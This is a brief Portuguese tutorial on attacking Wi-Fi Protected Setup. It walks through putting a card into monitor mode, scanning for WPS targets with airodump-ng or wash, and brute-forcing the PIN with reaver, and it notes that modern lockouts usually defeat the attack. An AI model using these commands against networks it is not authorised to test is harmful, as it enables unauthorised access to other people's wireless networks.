## Atacando WPS

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo, para o wps adicione a flag --wps

 ``` airodump-ng <interface> --wps ```
 
Ou também você pode usar a tool wash

 ``` wash -i <interface> ```


#### 3° passo:

Realizar um brute force no wps com a tool reaver

 ``` reaver -i <interface> -b BSSIDAP -c CHANNEL -vv --no-nacks ```
 
Obs: os ataques ao wps hoje em dia não são efetivos por causa de várias proteções que foram adicionadas, como bloqueio por tentativas erradas do PIN ou ate mesmo uma proteção emx que o wps ja vem desativado por padrão. Mas também existem outros tipos de ataques ao wps ...

